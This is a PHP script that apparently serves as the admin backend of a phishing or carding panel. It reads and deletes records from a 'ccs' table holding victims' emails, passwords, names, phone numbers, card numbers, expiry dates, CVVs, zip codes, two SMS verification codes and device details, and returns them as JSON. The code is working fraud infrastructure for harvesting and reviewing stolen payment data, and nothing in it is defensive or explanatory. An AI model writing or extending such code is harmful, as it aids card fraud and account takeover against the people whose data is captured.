<?php
require_once "../includes/connect.php";
$data ;
    if(isset($_GET["id"]) ){

        if($_GET["type"] == "fetch"){
            $stmt = $db->prepare("SELECT from_unixtime(UNIX_TIMESTAMP(date),'%y-%M-%D') as date , from_unixtime(UNIX_TIMESTAMP(date),'%W') as time ,
            id , `type`, `email`, `password`, `fname`, `lname`, `phone`, `cc`, `m_y`, `ccv`, `zip`, `sms_one`, `sms_two` , ip , browser , os , agent
            FROM ccs WHERE id =  ?");
        
            $stmt->execute(array($_GET["id"]));
            
            $row = $stmt->rowcount();
            
            $fetch = $stmt->fetch(PDO::FETCH_ASSOC);
            

            $data = array();
        
            if($row > 0){
                $fetch["check"] = "fall" ;
                $data = $fetch ;
            }else{
                $data =  array("check" => "empty");
            }
        }else if($_GET["type"] == "delete"){
            $stmt = $db->prepare("DELETE FROM ccs WHERE id =  ?");
        
            $stmt->execute(array($_GET["id"]));
            
            $row = $stmt->rowcount();
                        
            $data = array();
        
            if($row > 0){
                $data =  array("check" => "fall");
            }else{
                $data =  array("check" => "empty");
            }
        }
      
    }else{
        $stmt = $db->prepare("SELECT from_unixtime(UNIX_TIMESTAMP(date),'%y-%M-%D') as date , from_unixtime(UNIX_TIMESTAMP(date),'%W') as time ,
        id , `type`, `email`, `password`, `fname`, `lname`, `phone`, `cc`, `m_y`, `ccv`, `zip`, `sms_one`, `sms_two` , ip , browser , os , agent
         FROM ccs");
    
        $stmt->execute();
        
        $row = $stmt->rowcount();
        
        $fetchall = $stmt->fetchall(PDO::FETCH_ASSOC);
        
        $news = array();
        $data = array();
    
        if($row > 0){
        
            foreach($fetchall as $fetch){
                $fetch["check"] = "fall" ;
                array_push($news,$fetch) ;
            }   $data =  $news ;
        }else{
            $data =  [array("check" => "empty")];
        }
    }

   
    echo json_encode($data , JSON_UNESCAPED_UNICODE);
  $db = null ;
?>